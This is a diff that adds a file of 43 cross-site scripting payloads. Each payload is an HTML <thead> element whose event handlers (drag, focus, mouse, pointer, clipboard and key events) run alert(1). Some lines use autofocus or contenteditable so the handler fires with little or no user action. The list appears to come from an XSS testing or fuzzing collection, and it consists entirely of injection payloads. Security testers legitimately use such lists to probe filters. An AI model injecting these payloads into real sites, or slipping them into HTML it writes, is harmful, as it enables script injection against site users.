@@ -1,0 +1,43 @@
+<thead draggable="true" ondrag="alert(1)">test</thead>
+<thead draggable="true" ondragend="alert(1)">test</thead>
+<thead draggable="true" ondragenter="alert(1)">test</thead>
+<thead draggable="true" ondragleave="alert(1)">test</thead>
+<thead draggable="true" ondragstart="alert(1)">test</thead>
+<thead id=x tabindex=1 onactivate=alert(1)></thead>
+<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>
+<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>
+<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>
+<thead id=x tabindex=1 onfocus=alert(1)></thead>
+<thead id=x tabindex=1 onfocusin=alert(1)></thead>
+<thead onafterscriptexecute=alert(1)><script>1</script>
+<thead onbeforecopy="alert(1)" contenteditable>test</thead>
+<thead onbeforecut="alert(1)" contenteditable>test</thead>
+<thead onbeforepaste="alert(1)" contenteditable>test</thead>
+<thead onbeforescriptexecute=alert(1)><script>1</script>
+<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>
+<thead onclick="alert(1)">test</thead>
+<thead oncontextmenu="alert(1)">test</thead>
+<thead oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<thead oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<thead ondblclick="alert(1)" autofocus tabindex=1>test</thead>
+<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>
+<thead onkeydown="alert(1)" contenteditable>test</thead>
+<thead onkeypress="alert(1)" contenteditable>test</thead>
+<thead onkeyup="alert(1)" contenteditable>test</thead>
+<thead onmousedown="alert(1)">test</thead>
+<thead onmouseenter="alert(1)">test</thead>
+<thead onmouseleave="alert(1)">test</thead>
+<thead onmousemove="alert(1)">test</thead>
+<thead onmouseout="alert(1)">test</thead>
+<thead onmouseover="alert(1)">test</thead>
+<thead onmouseup="alert(1)">test</thead>
+<thead onmousewheel=alert(1)>requires scrolling
+<thead onpaste="alert(1)" contenteditable>test</thead>
+<thead onpointerdown=alert(1)>XSS</thead>
+<thead onpointerenter=alert(1)>XSS</thead>
+<thead onpointerleave=alert(1)>XSS</thead>
+<thead onpointermove=alert(1)>XSS</thead>
+<thead onpointerout=alert(1)>XSS</thead>
+<thead onpointerover=alert(1)>XSS</thead>
+<thead onpointerrawupdate=alert(1)>XSS</thead>
+<thead onpointerup=alert(1)>XSS</thead>
